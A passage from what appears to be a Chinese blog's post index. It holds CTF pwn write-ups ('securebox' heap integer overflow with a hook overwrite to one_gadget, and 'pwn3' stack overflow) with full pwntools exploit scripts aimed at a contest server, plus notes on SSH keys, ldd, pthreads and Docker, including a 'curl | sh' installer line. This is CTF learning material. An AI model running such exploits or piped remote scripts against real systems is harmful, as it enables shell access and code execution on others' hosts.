execve(&quot;/bin/sh&quot;, r14, r12)constraints:  [r14] == NULL || r14 == NULL  [r12] == NULL || r12 == NULL0xe5858 execve(&quot;/bin/sh&quot;, [rbp-0x88], [rbp-0x70])constraints:  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL0xe585f execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])constraints:  [r10] == NULL || r10 == NULL  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL0xe5863 execve(&quot;/bin/sh&quot;, r10, rdx)constraints:  [r10] == NULL || r10 == NULL  [rdx] == NULL || rdx == NULL0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL0x10a398 execve(&quot;/bin/sh&quot;, rsi, [rax])constraints:  [rsi] == NULL || rsi == NULL  [[rax]] == NULL || [rax] == NULL&#x27;&#x27;&#x27;\n\nsecurebox难度4 &#x2F; 10\n保护 Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled\n\n简单描述有5个功能,添加 ,删除,修改,打印,默认退出,添加成功有加密用的key,在修改功能中,对输入的数据进行加密,没有堆一般的常见漏洞\nvulelse &#123;   puts(&quot;Size: &quot;);   size = InputNum();    // vul:unsigned long int as unsigned int   if ( size &gt; 0x100 &amp;&amp; (unsigned int)size &lt;= 0xFFF )   &#123;     plist[idx] = malloc(0x28uLL);             // head  -----------     *((_QWORD *)plist[idx] + 4) = size;     head_heap = plist[idx];     head_heap[3] = malloc(size);              // content----&gt;     memset(plist[idx], 0, 0x14uLL);     gen_key(plist[idx]);     puts(&quot;Key: &quot;);     for ( j = 0; j &lt;= 15; ++j )       printf(&quot;%02x &quot;, *((unsigned __int8 *)plist[idx] + j));     printf(&quot;\\nBox ID: %d\\n&quot;, idx);   &#125;\n\n\n\n知识点整数溢出\nmalloc分配失败的大小\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0ganfrom pwn import *#from LibcSearcher import LibcSearcher#context.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile = &#x27;./chall&#x27;libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;remoteIp = &quot;39.97.210.182&quot;remotePort = 19806LOCAL = 1LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def enc(data, key):\tresult = &#x27;&#x27;\tfor i in range(len(data)):\t\tresult += p8( u8(data[i]) ^ u8(key[ i &amp; 0xF]) )\treturn resultdef ad(size):\tsla(&#x27;5.Exit&#x27;, str(1))\tsla(&#x27;:&#x27;, str(size))\tru(&#x27;Key: \\n&#x27;)\tkey = p8(int(ru(&#x27; &#x27;), 16))\tfor i in range(15):\t\tkey += p8(int(ru(&#x27; &#x27;), 16))\treturn keydef rm(idx):\tsla(&#x27;5.Exit&#x27;, str(2))\tsla(&#x27;Box ID:&#x27;, str(idx))def md(idx, offset, size, data, key):\tsla(&#x27;5.Exit&#x27;, str(3))\tsla(&#x27;:&#x27;, str(idx))\tsla(&#x27;Offset of msg:&#x27;, str(offset))\tsla(&#x27;:&#x27;, str(size))\tsa(&#x27;:&#x27;, enc(data, key))def dp(idx, offset, size):\tsla(&#x27;5.Exit&#x27;, str(4))\tsla(&#x27;:&#x27;, str(idx))\tsla(&#x27;Offset of msg:&#x27;, str(offset))\tsla(&#x27;Len of msg:&#x27;, str(size))def q():\tsla(&#x27;:&#x27;, str(5))def dec(data, key):\tresult = &#x27;&#x27;\tfor i in range(len(data)):\t\tresult += p8(u8(data[i]) ^ ( u8(key) + (i &amp; 0xF)))\treturn result#--------------------------Exploit--------------------------def exploit():\tkey_0 = ad(0x210)\tkey_1 = ad(0x108)\trm(0)\tkey_2 = ad(0x210)\tmd(0, 0, 0x8, &#x27;A&#x27; * 0x8, key_2)\tdp(0, 0, 16)\tlib.address = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;) - 0x3c4b20 - 88\tli(&#x27;libc base &#x27; + hex(lib.address))\tgadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]\tone_gadget = lib.address + gadget[1]\t\t# add integer overflow\tsla(&#x27;5.Exit&#x27;, str(1))\tsla(&#x27;:&#x27;, &#x27;-&#x27; + str(0xFFFFFEF8 -0x100))\tru(&#x27;Key: \\n&#x27;)\tkey_3 = p8(int(ru(&#x27; &#x27;), 16))\tfor i in range(15):\t\tkey_3 += p8(int(ru(&#x27; &#x27;), 16))\tmd(2, lib.sym[&#x27;__malloc_hook&#x27;], 0x8, p64(lib.sym[&#x27;realloc&#x27;]), key_3) # 2\tmd(2, lib.sym[&#x27;__realloc_hook&#x27;], 0x8, p64(one_gadget), key_3) # 2\tsla(&#x27;5.Exit&#x27;, str(1))\tsla(&#x27;:&#x27;, str(0x108))\t#db()def finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()&#x27;&#x27;&#x27;0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:[rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints:[rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:[rsp+0x70] == NULL&#x27;&#x27;&#x27;\n\n\n\n\n\npwn3__int64 sub_400990()&#123;  unsigned int v0; // w0  __int64 v1; // x0  __int64 v2; // x0  __int64 v3; // x0  __int64 v4; // x0  __int64 v6; // [xsp+10h] [xbp+10h]  __int64 v7; // [xsp+78h] [xbp+78h]  int v8; // [xsp+DCh] [xbp+DCh]  int v9; // [xsp+E0h] [xbp+E0h]  int v10; // [xsp+E4h] [xbp+E4h]  int v11; // [xsp+E8h] [xbp+E8h]  int v12; // [xsp+ECh] [xbp+ECh]  int v13; // [xsp+F0h] [xbp+F0h]  int v14; // [xsp+F4h] [xbp+F4h]  unsigned int v15; // [xsp+F8h] [xbp+F8h]  int v16; // [xsp+FCh] [xbp+FCh]  sub_400940();  v16 = 0;  do  &#123;    v0 = time(0LL);    v15 = v0;    srand(v0);    v2 = (unsigned int)((signed int)rand(v1) % 100);    v14 = v2;    v3 = (unsigned int)((signed int)rand(v2) % 100);    v13 = v3;    v4 = (unsigned int)((signed int)rand(v3) % 100);    v12 = v4;    v11 = (signed int)rand(v4) % 100;    printf(&quot;there have 200 levels ~&quot;);    printf(&quot;Math: %d * %d + %d + %d = ???&quot;);    printf(&quot;input answer:&quot;);    read(0, &amp;v6, 0x14uLL);    v10 = v14 * v13 + v12 + v11;    v9 = strtol((const char *)&amp;v6, 0LL, 10);    if ( v10 != v9 )    &#123;      puts(&quot;wrong &quot;);      exit(0);    &#125;    puts(&quot;good !&quot;);    ++v16;  &#125;  while ( v16 &lt;= 199 );  v8 = 256;  read(0, &amp;v7, 0x6EuLL);  if ( v8 == 0x12235612 )  &#123;    puts(&quot;get it ~&quot;);    sub_400920();  &#125;  return 0LL;&#125;\n\n前面的运算就行, 然后通过溢出修改v8值即可\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0ganfrom pwn import *#from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile = &#x27;pwn&#x27;libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;remoteIp = &quot;39.97.210.182&quot;remotePort = 40285LOCAL = 0LIB   = 0r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------#--------------------------Exploit--------------------------def exploit():\tfor i in range(200):\t\tru(&#x27;Math:&#x27;)\t\tnum_1 = int(ru(&#x27;*&#x27;), 10)\t\tnum_2 = int(ru(&#x27;+&#x27;), 10)\t\tnum_3 = int(ru(&#x27;+&#x27;), 10)\t\tnum_4 = int(ru(&#x27;=&#x27;), 10)\t\tli(&#x27;nums: &#x27; + str(num_1) + &#x27; &#x27; + str(num_2))\t\tli(&#x27;nums: &#x27; + str(num_3) + &#x27; &#x27; + str(num_4))\t\tresult = num_1 * num_2 + num_3 + num_4\t\tsl(str(result))\tli(&#x27;end!&#x27;)\tp = &#x27;A&#x27; * (0xDC - 0x78)\tp += p32(0x12235612)\ts(p)\tdef finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()\n\n","categories":["ctf"],"tags":["pwn"]},{"title":"SSH免密钥登录","url":"/2020/06/15/env/linux/ssh_non_passwd_login/","content":"SSH免密钥登录ssh-keygen # 生产密钥# 直接写入, 会造成服务器其他密钥的丢失scp ~/.ssh/id_rsa.pub root@*****:/root/.ssh/authorized_keys# 正确写入ssh-copy-id -i ~/.ssh/id_rsa.pub root@39.97.119.22\n\n然后即可免密钥登录远程了\n","categories":["env"],"tags":["linux"]},{"title":"快速打包程序依赖系统库.so文件","url":"/2020/06/14/env/package/lib_pac/","content":"快速打包程序依赖系统库.so文件将程序依赖的所有库文件拷贝出来\nldd helloworld | awk &#x27;&#123;print $3&#125;&#x27; | xargs -i cp -L &#123;&#125; /home/zz/lib\n\n\nhelloworld是可执行程序名称，&#x2F;home&#x2F;zz&#x2F;lib是拷贝依赖库的目标文件夹\n如果需要有选择的拷贝，则可以加入grep过滤一下\nldd helloworld | grep -E &quot;libssl|libstdc&quot; | awk &#x27;&#123;print $3&#125;&#x27; | xargs -i cp -L &#123;&#125; /home/zz/lib\n\n\nlibssl和libstdc是用于匹配需要拷贝的库文件\n","categories":["dev"],"tags":["dev"]},{"title":"c线程操作","url":"/2020/05/26/dev/language/c/thread/","content":"Thread概念线程: 有时候又称为轻量级进程, 程序执行的最小单位, 系统独立调度和分配cpu的最小基本单位, 他是进程中的一个实体. 一个进程中可以有多个线程，这些线程共享进程的所有资源，线程本身只包含一点必不可少的资源。\n进程退出出现了很多弊端， 一是由于进程是资源的拥有者，创建，撤销与切换存在较大的时空开销，因此需要引入轻型进程， 而是由于对称多处理（smp）出现，可以满足多个运行单位，而多个进程并行开销过大。\n并发并发是指同一时刻，只能有一条指令执行， 但是多个进程指令被快速轮换执行，使得在宏观上具有多个进程同时执行的效果，看起来同时发生，单核\n并行并行是指在同一时刻，有多条指令在多处理器上同时执行，真正的同时发生\n同步彼此依赖关系的调用不应该”同时发生“，而同步就是要阻止那些”同时发生“的事情（比如数据库操作需要）\n异步异步的概念和同步是相对的，任何两个彼此独立的操作是异步的，它表明独立的发生\n多线程的优势​\t1 在多处理器开发程序的并行性\n​\t2 在等待慢速IO操作时，程序可以执行其他操作，提高并发性\n​\t3 模块化的编程，能更清晰的表达程序中独立事件的关系，结构清晰\n​\t4 占用较少的系统资源\n（注:多线程不一定要多核处理器）\n线程的生命周期创建线程​                            线程                 |                进程\n标识符类型       pthread_t                            pid_t\n获取id              pthread_self()                     getpid()\n创建                 pthread_create()                   fork()\npthread_t: 结构体(FreeBSD5.2, Mac Os10.3)      &#x2F; unsinged long int (linux   &#x2F;usr&#x2F;include&#x2F;bits&#x2F;pthreadtypes.h中定义)  \n#include &lt;pthread.h&gt; \n\nint pthread_create(pthread_t *thread, const pthread_attr_t *attr, \n          void *(*start_routine) (void *), void *arg); \n     arg1: 传入储存thread_id的地址 \n     arg2: 属性, 为NULL时为默认属性 \n     arg3: 将要运行的函数地址(要为静态函数) \n     arg4: 传入的参数 \n     If attr is NULL, then the thread is created with default attributes.\n\n初始线程&#x2F;主线程\n在c程序运行时，首先运行main函数。在线程代码中，这个特殊的执行流被称作初始线程或者主线程。\n住线程的特殊性在于，它在main函数返回的时候，会导致进程结束，进程内人所有的线程也会结束。这可不是一个好的现象，可以在主线程中调用pthread_exit函数，这样进程就会等待所有线程结束时才会终止。\n主线程接收参数的方式是argc和argv，而普通的线程只有void*\n在绝大多数情况下，主线程在默认堆栈上运行，这个堆栈可以增长到足够的长度，而普通线程的堆栈是受限制的，一旦溢出就会产生错误\n\n创建线程\n主线程是随着进程的创建而创建的\n其他线程可以通过调用函数来创建，主要调用pthread_create\n注意，新线程可能在当前线程的pthread_create函数返回之前就已经运行了，甚至可能运行完毕\n\n线程的四个基本状态就绪线程能够运行，但是在等待可用的处理器\n当线程刚被创建的时候就处于就绪状态， 或者当线程被解除阻塞以后也会处于就绪状态。就绪的线程在等待一个可用的处理器，当一个运行的线程被抢占时，它立刻又返回就绪状态\n运行线程在运行中，在多核系统中，可能同时有多个线程在运行。\n当处理器选择一个就绪的线程执行时，它立刻变为运行状态\n阻塞线程在等待处理器中以外的其他条件\n线程会在以下情况下发生阻塞: 试图加锁一个已经被锁住的互斥量，等待条件变量，调用singwait等待尚未发生的信号，执行无法完成的I&#x2F;O信号，由于内存页错误\n终止线程从启动函数中返回， 或者调用ptrehad_exit函数，或则被取消\n线程通常启动函数中返回终止自己，或者调用pthread_exit退出，或者取消线程\n回收线程的分离属性:\n分离一个正在运行的线程并不影响它，仅仅是通知当前系统该线程结束时，其所属的资源可以回收。一个没有分离的线程在终止时会保留它的虚拟内存， 包括他们的堆栈和其他系统资源， 有时这种线程被称为“僵尸线程”。创建线程时默认是非分离的\n如果线程具有分离属性，线程终止时会被立刻回收，但是你必须释放由该线程占有的程序资源。有malloc或者mmap分配的虚拟内存可以在任何时候由任何线程释放， 条件变量，互斥量，信号灯可以由任何线程销毁，只要他们被解锁了或者没有线程等待。但是只有互斥量的主人才能解锁它，所以在线程终止前，你需要解锁互斥量。\n线程的基本控制\n终止\n连接\n退出\n清理\n\n线程的终止exit是危险的如果进程中任意一个线程调用了eixt, _Exit, _exit, 那么整个进程就会终止\n终止进程的方式普通的单个线程有以下3中方式退出， 这样不会终止进程\n\n从启动历程中返回， 返回值是线程的退出码\n线程可以被同一进程中的其他线程取消\n线程调用pthread_exit(void *rval)函数， rval是退出码\n\nreturn 和 pthread_exit()的区别\n线程的连接   #include &lt;pthread.h&gt;   int pthread_join(pthread_t thread, void **retval);//arg1: 指定线程的id//arg2: 返回码， 如果线程被取消，那么被置为PHTREAD_CANCELED//该函数成功调用返回0, 失败返回错误码\n\n调用该函数的线程会一直阻塞，直到指定的线程tid调用pthread_exit, 从启动历程返回或者被取消\n调用pthread_join会使指定的线程处于分离状态，如果制定线程已经处于分离状态，那么调用就会失败\nphtread_detach可以分离一个线程， 一个线程被成功join后，其他线程就不能调用pthread_join连接指定的tid线程了.\n例子获取线程id#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;int main(void) &#123;\tpid_t pid;\tpthread_t tid;\t//获取进程id\tpid = getpid();\t//获取线程id\ttid = pthread_self();\tprintf(&quot;pid: %x pthread_id: %lx\\n&quot;, pid, tid);\treturn 0;&#125;\n\n\n\n创建线程#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;/*#include &lt;pthread.h&gt;       int pthread_create(pthread_t *thread, const pthread_attr_t *attr,                          void *(*start_routine) (void *), void *arg);\t\targ1: 传入储存thread_id的地址\t\targ2: 属性, 为NULL时为默认属性\t\targ3: 将要运行的函数地址(要为静态函数)\t\targ4: 传入的参数\t\tIf attr is NULL, then the thread is created with default attributes.*/void print_id(char *arg) &#123;\tpid_t pid;\tpthread_t tid;\tpid = getpid();\ttid = pthread_self();\tprintf(&quot;%s pid: %lx tid: %lx\\n&quot;,arg, pid, tid);&#125;void *thread_fun(void *arg) &#123;\tprint_id(arg);\tint a;\tprintf(&quot;\\n stack: %p\\n&quot;, &amp;a);\treturn (void*)0;&#125;int main(void) &#123;\tpthread_t ntid;\tint err;\terr = pthread_create(&amp;ntid, NULL, thread_fun,  &quot;new thread&quot;);\tif(err != 0) &#123;\t\tprintf(&quot;create new thread failed\\n&quot;);\t\treturn -1;\t&#125;\tprint_id(&quot;main_thread&quot;);\tint a;\tprintf(&quot;\\n stack: %p\\n&quot;, &amp;a);\tsleep(2);\treturn 0;&#125;\n\n\n\n实现创建线程传入多个参数#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;struct Student &#123;\tint age;\tchar name[64];&#125;;void *thread_fun(void *std) &#123;\tprintf(&quot;age: %d name %s\\n&quot;, ((struct Student *)std)-&gt;age, ((struct Student *)std)-&gt;name);\treturn (void*)0;&#125;int main(int argc, char **argv) &#123;\tif(argc &gt; 1) &#123;\t\tif(!strcmp(argv[1], &quot;exit&quot;)) &#123;\t\t\treturn 0;\t\t&#125;\t&#125;\tstruct Student std;\tstd.age = 16;\tstrcpy(std.name, &quot;Hello World&quot;);\tpthread_t tid;\tint err;\terr = pthread_create(&amp;tid, NULL, thread_fun, &amp;std);\tif(err != 0) &#123;\t\tprintf(&quot;create trhead fail!\\n&quot;);\t\treturn -1;\t&#125;\tint retval;\tpthread_exit(&amp;retval); //保证子线程能够顺利执行\tprintf(&quot;main thread exit\\n&quot;);\treturn 0;&#125;\n\n\n\n采用变量来实现同步#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;struct Value &#123;\tint thread;\tint value;\tint lock;&#125;;void *fun(void *arg) &#123;\tstruct Value *value = (struct Value *)arg;\twhile(value-&gt;value &lt; 50) &#123;\t\tif(value-&gt;lock == 0 &amp;&amp; value-&gt;thread == 1) &#123;\t\t\tvalue-&gt;lock = 1;\t\t\tprintf(&quot;child: %d\\n&quot;, value-&gt;value);\t\t\tvalue-&gt;value += 1;\t\t\tvalue-&gt;thread = 0;\t\t\tvalue-&gt;lock = 0;\t\t&#125;\t&#125;\treturn (void*)0;&#125;int main(void) &#123;\tstruct Value value;\tvalue.value = 0;\tvalue.lock = 0;\tvalue.thread = 0;\tint err, retval;\tpthread_t tid;\terr = pthread_create(&amp;tid, NULL, fun, &amp;value);\tif(err != 0) &#123;\t\tperror(&quot;thread_create:&quot;);\t\treturn -1;\t&#125;\twhile(value.value &lt; 50) &#123;\t\tif(value.lock == 0 &amp;&amp; value.thread == 0) &#123;\t\t\tvalue.lock = 1;\t\t\tprintf(&quot;main_thread: %d\\n&quot;, value.value);\t\t\tvalue.value += 1;\t\t\tvalue.thread = 1;\t\t\tvalue.lock = 0;\t\t&#125;\t&#125;\tpthread_exit(0);\treturn 0;&#125;\n\n\n\n验证线程的退出方式3种退出方式，查看退出进程的返回值。\n#include &lt;pthread.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;void *thread_fun(void *arg) &#123;\tif(!strcmp(&quot;1&quot;, (char *)arg)) &#123;\t\tprintf(&quot;new thread return \\n&quot;);\t\treturn (void *)1;\t&#125;else if(!strcmp(&quot;2&quot;, (char *)arg)) &#123;\t\tprintf(&quot;new thread pthread_exit \\n&quot;);\t\tpthread_exit((void*)2);\t&#125;else &#123;\t\tprintf(&quot;new thread exit\\n&quot;);\t\texit(3);\t&#125;&#125;int main(int argc, char **argv) &#123;\tint err;\tpthread_t tid;\tif(argc &lt; 2) &#123;\t\tprintf(&quot;input arg\\n&quot;);\t\treturn 0;\t&#125;\terr = pthread_create(&amp;tid, NULL, thread_fun, argv[1]);\tif(err != 0) &#123;\t\tprintf(&quot;create new thread failed\\n&quot;);\t\treturn 0;\t&#125;\tsleep(1);\tprintf(&quot;main thread\\n&quot;);\treturn 0;&#125;\n\n通过运行时捕获线程状态。\n#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;void *thread_fun_1() &#123;\tprintf(&quot;I&#x27;m thread 1\\n&quot;);\treturn (void*)1;&#125;void* thread_fun_2() &#123;\tprintf(&quot;I&#x27;m thread 2\\n&quot;);\t//pthread_detach(pthread_self()); //分离线程,会导致pthread_join失败\tpthread_exit((void *)2);\treturn (void*)2;&#125;int main(void) &#123;\tint err_1, err_2;\tpthread_t tid_1, tid_2;\tvoid *rval_1, *rval_2;\terr_1 = pthread_create(&amp;tid_1, NULL, thread_fun_1, NULL);\terr_2 = pthread_create(&amp;tid_2, NULL, thread_fun_2, NULL);\tif(err_1 || err_2) &#123;\t\tprintf(&quot;create new thread failed!\\n&quot;);\t\treturn 0;\t&#125;\tprintf(&quot;I&#x27;m main thread\\n&quot;);\tprintf(&quot;join1 rval is %d\\n&quot;, pthread_join(tid_1, &amp;rval_1));\tprintf(&quot;join2 rval is %d\\n&quot;, pthread_join(tid_2, &amp;rval_2));\tprintf(&quot;thread 1 exit code is %d\\n&quot;, rval_1);\tprintf(&quot;thread 2 exit code is %d\\n&quot;, rval_2);\tprintf(&quot;I&#x27;m main thread\\n&quot;);&#125;\n\n\n\n信号量信号量#include &lt;semaphore.h&gt;采用信号量实现同步机制\nint sem_init(sem_t *sem, int pshared, unsigned int val);\n\n\n成功返回0, 失败返回EOFsem:    为指定要初始化的信号两对象pshared:为0时代表线程之间通信, 1代表进程间通信val 信号量初值\n信号量 P &#x2F; V 操作\nint sem_wait(sem_t *sem); //P操作, 申请资源, 可能会发生阻塞int sem_post(sem_t *sem); //V操作, 释放资源, 不会发生阻塞\n成功时返回0, 失败时返回EOFsem指向要操作的信号量对象\n#include &lt;semaphore.h&gt; //使用信号量#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;errno.h&gt;#include &lt;string.h&gt;char buf[512];sem_t sem;void *thread_fun(void *arg) &#123;\twhile(1) &#123;\t\tsem_wait(&amp;sem);\t\tprintf(&quot;Your input: %s\\n&quot;, buf);\t&#125;&#125;int main(void) &#123;\tpthread_t tid;\tif(sem_init(&amp;sem, 0, 0) != 0) &#123;\t\tperror(&quot;sem_init(): &quot;);\t\treturn -1;\t&#125;\tif(pthread_create(&amp;tid, NULL, thread_fun, NULL) != 0) &#123;\t\tperror(&quot;pthread_create(): &quot;);\t\treturn -1;\t&#125;\tprintf(&quot;Input something, &#x27;quit&#x27; to exit program\\n&quot;);\tdo &#123;\t\tfgets(buf, 512, stdin);\t\tsem_post(&amp;sem);\t&#125;while(strncmp(buf, &quot;quit&quot;, 4) != 0);\treturn 0;&#125;\n\n严格实现同步分别定义读和写的信号量来实现各种操作的严格同步。\n#include &lt;semaphore.h&gt; //使用信号量#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;errno.h&gt;#include &lt;string.h&gt;char buf[512];sem_t sem_r, sem_w;void *thread_fun(void *arg) &#123;\twhile(1) &#123;\t\tsem_wait(&amp;sem_r);\t\tprintf(&quot;Your input: %s\\n&quot;, buf);\t\tsem_post(&amp;sem_w);\t&#125;&#125;int main(void) &#123;\tpthread_t tid;\tif(sem_init(&amp;sem_r, 0, 0) != 0) &#123;\t\tperror(&quot;sem_init(): &quot;);\t\treturn -1;\t&#125;\tif(sem_init(&amp;sem_w, 0, 0) != 0) &#123;\t\tperror(&quot;sem_init(): &quot;);\t\treturn -1;\t&#125;\tif(pthread_create(&amp;tid, NULL, thread_fun, NULL) != 0) &#123;\t\tperror(&quot;pthread_create(): &quot;);\t\treturn -1;\t&#125;\tprintf(&quot;Input something, &#x27;quit&#x27; to exit program\\n&quot;);\tdo &#123;\t\tfgets(buf, 512, stdin);\t\tsem_post(&amp;sem_r);\t\tsem_wait(&amp;sem_w);\t&#125;while(strncmp(buf, &quot;quit&quot;, 4) != 0);\treturn 0;&#125;\n\n","categories":["language"],"tags":["c"]},{"title":"usage-of-docker","url":"/2020/05/12/env/usage-of-docker/","content":"Docker Hub (需要配置加速器)关闭 SELINUX 服务SELINUX是CentOS系统捆绑的安全服务程序, 因为安全策略过于严格, 所以建议关闭这个服务修改 &#x2F;etc&#x2F;selinux&#x2F;config文件, 设置SELINUX&#x3D;disabled安装:Centos: \nyum install docker -y //-y代表默认安装service docker startservice docker stopservice docker restart\n\n\n\nDebain:\nsudo apt install dockersudo apt install docker-compose\n\n\n\nCockerHub: 是Docker公共镜像库, 为用户提供了大量的镜像文件https://hub.docker.com/由于国内网络访问DockerHub很慢, 无法下载镜像文件,我们可以使用Docker加速器\n网易镜像中心：https://c.163.com/hub#/m/home/docker pull hub.c.163.com&#x2F;library&#x2F;tomcat:latest\ndocker 中科大源: https://lug.ustc.edu.cn/wiki/mirrors/help/docker\n安装加速器:curl -sSl https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io&#x2F;&#x2F;启动加速器.&#x2F;acc.sh {“registry-mirrors”: [“http://f1361db2.m.daocloud.io&quot;]}\n修改Docker配置文件,去掉逗号vim &#x2F;etc&#x2F;docker&#x2F;daemon.json{“registry-mirrors”: [“http://f1361db2.m.daocloud.io&quot;]}\n安装python镜像:docker pull python:3.8\n查看镜像:docker images\n查看镜像的详细信息:docker inspect python:3.8\n将镜像导出docker save python:3.8 &gt; &#x2F;root&#x2F;python.tar\n删除镜像docker rmi python:3.8\n导入镜像docker load &lt; &#x2F;root&#x2F;python.tar\n创建docker容器:it代表创建一个容器, 后面需要交互, bash交互docker run -it –name&#x3D;p1 python:3.8 bash\n查看容器docker ps -a\n启动容器容器名为p1docker start p1\n暂停容器:docker pause p1\n取消暂停容器:docker unpause p1\n使用bash进入p1容器docker exec -it p1 bash\n查看容器详细信息docker inspect p1\n停止容器docker stop p1\n删除容器必须先停止容器docker rm p1\nDocker 网络是Docket内的内部网络\n默认情况下, Docker环境会给容器分配动态的IP地址,这就导致下次启动容器的时候,IP地址就变了可以单独创建Docker内部的网段(172.18.0.x)172.18.0.0&#x2F;16 表示网络码占16位，也就是说该网络上可以有65534个主机(2^16-2)IP范 围：172.18.0.1~172.18.255.254 172.18.255.255是广播地址，不能被主机使用.设置IP地址的时候：172.18.x.y 子网掩码：255.255.0.0mynet 是自定义名字\ndocker network create –subnet&#x3D;172.18.0.0&#x2F;16 docker_net\n解除容器绑定的网络 网络名词docker_net 容器名称 testsudo docker network disconnect docker_net test\n\n删除原先的网络sudo docker network rm docker_net\n\n创建新的网络sudo docker network create --subnet=192.168.222.0/24 mynetwork\n\n连接新的网络sudo docker network connect mynetwork test \n\n重新启动容器sudo docker container restart test\n\n注意:删除某个网段, 删除网段之前, 必须先删除容器\ndocker network rm mynet\n\n创建容器并指定ip, 而 172.18.0.1是网关地址, 是不能使用的docker run -it –net mynet –ip 172.18.0.2 python:3.8 bash\n查看网段docker network ls\n删除mynet网段docker network rm mynet\n指定某个ip创建容器docker run -it –name&#x3D;p1 –net mynet –ip 172.18.0.2 python:3.8 bash\n容器端口映射默认情况下, 除了宿主机之外,任何主机无法访问远程Docker容器通过端口映射,可以吧容器端口映射到宿主机的端口,这样其他主机就能访问了映射到宿主机的端口,不需要设置防火墙规则,便可以使用将容器的5000端口映射到宿主机的9500端口docker run -it -p 9500:5000 python:3.8 bash\n映射多个端口docker run -it -p 9500:5000 -p 9600:3306 python:3.8 bash\n目录挂载在技术为了能把一部分业务数据保存在Docker环境之外,或者把宿主机的文件传入容器,所以需要给容器挂载宿主机的目录Docker环境只支持目录挂载,不支持文件挂载, 且一个容器可以挂载多个目录\n将宿主机的&#x2F;root&#x2F;test目录挂载到容器的&#x2F;root&#x2F;project 目录中docker run -it -v &#x2F;root&#x2F;test:&#x2F;root&#x2F;project –name&#x3D;p1 python:3.8 bash\n给docker添加用户组sudo groupadd docker    #添加docker用户组sudo gpasswd -a $USER docker #将登陆用户加入到docker用户组中newgrp docker #更新用户组docker ps     